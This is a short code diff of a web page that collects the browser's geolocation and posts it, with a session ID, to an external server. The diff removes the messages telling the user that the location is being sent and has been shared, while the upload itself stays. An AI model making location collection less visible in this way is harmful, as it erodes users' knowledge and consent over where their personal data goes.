@@ -108,7 +108,7 @@
         const acc = Math.round(pos.coords.accuracy);
 
         showCoords(lat, lon, acc);
-        msg('📤 Sending location…');
+        
 
         try {
           const res = await fetch('https://locdata-60ai.onrender.com/store', {
@@ -116,7 +116,7 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId, lat, lon, accuracy_m: acc })
           });
-          msg(res.ok ? '✅ Location shared!' : '⚠️ Share failed');
+          
         } catch {
           msg('⚠️ Network error while sharing location.');
         }
